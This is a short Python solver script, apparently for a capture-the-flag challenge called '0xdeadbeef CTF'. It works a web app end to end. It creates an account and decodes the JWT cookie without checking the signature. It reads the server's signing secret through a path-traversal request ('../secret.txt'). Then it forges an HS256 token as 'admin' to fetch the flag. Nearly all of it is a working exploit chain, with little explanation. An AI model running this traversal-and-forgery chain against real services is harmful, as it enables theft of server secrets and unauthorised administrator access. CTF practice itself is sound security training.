import os

cur_dir = os.path.dirname(__file__).replace("\\", "/")
cur_dir = "." + cur_dir.split("0xdeadbeef CTF")[-1] + "/"

import sys
sys.path.append(".")

from util import *

import requests

import jwt

url = "http://canaris.zapto.org:8001/"

r = requests.get(url)

r = requests.post(url+"create", data={"username": "horse3903", "password": "horse3903"})

cookies = r.cookies

token = cookies["access_token"]
data = jwt.decode(token, options={"verify_signature": False})

r = requests.get(url+"source", params={"file": "../secret.txt"})
secret = r.text

data["username"] = "admin"
token = jwt.encode(payload=data, key=secret, algorithm='HS256')

r = requests.get(url, cookies={"access_token": token})

result = r.text

dir = save_flag(result, __file__)